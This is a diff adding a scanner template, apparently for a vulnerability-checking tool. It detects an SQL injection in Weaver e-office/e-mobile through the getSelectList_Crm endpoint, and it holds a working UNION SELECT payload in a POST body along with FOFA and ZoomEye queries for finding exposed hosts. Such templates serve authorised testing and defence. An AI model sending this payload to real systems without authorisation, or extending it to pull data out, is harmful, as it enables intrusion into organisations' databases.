@@ -1,0 +1,25 @@
+id: ecology-e-office-getselectlist-crm-sqli
+
+info:
+  name: 泛微e-office系统存在SQL注入漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    FOFA: app="泛微-EOffice"
+    ZoomEye: app:"泛微移动办公平台e-mobile"
+  tags: ecology,sqli,e-mobile,e-office,e-cology
+  created: 2023/10/25
+
+set:
+  randInt: randomInt(60000, 66800)
+  # randMd5: md5(string(randomInt))
+rules:
+  r0:
+    request:
+      method: POST
+      path: /E-mobile/App/Init.php?m=getSelectList_Crm
+      body: |
+        cc_parent_id=-999 /*!50000union*/ /*!50000select*/ 1,md5({{randInt}})#
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(string(randInt))))
+expression: r0()
